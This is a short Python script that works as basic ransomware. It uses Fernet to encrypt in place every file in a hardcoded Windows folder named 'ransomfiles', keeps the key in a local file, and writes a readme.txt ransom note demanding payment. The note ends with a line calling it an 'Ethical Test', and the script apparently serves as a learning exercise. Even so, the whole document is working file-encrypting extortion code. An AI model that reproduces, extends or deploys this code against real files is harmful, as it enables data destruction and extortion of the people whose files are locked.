from cryptography.fernet import Fernet
import os

def create_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def return_key():
    return open("key.key", "rb").read()

def encrypt(elements, key):
    f = Fernet(key)
    for element in elements:
        with open(element, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(element, "wb") as file:
            file.write(encrypted_data)

if __name__ == "__main__":
    path = "C:\\Users\\yukik\\OneDrive\\Escritorio\\ransomfiles"
    elements = os.listdir(path)
    full_path = [path + "\\" + element for element in elements]

    create_key()
    key = return_key()

    encrypt(full_path, key)

    with open(path + "\\" + "readme.txt", "w") as file:
        file.write("Your data has been encrypted.\n")
        file.write("Please follow further instructions to get your files back.\n")
        file.write("You must pay a rescue following these steps:\n")
        file.write(" ::: End of Ransomware Ethical Test ::: ")
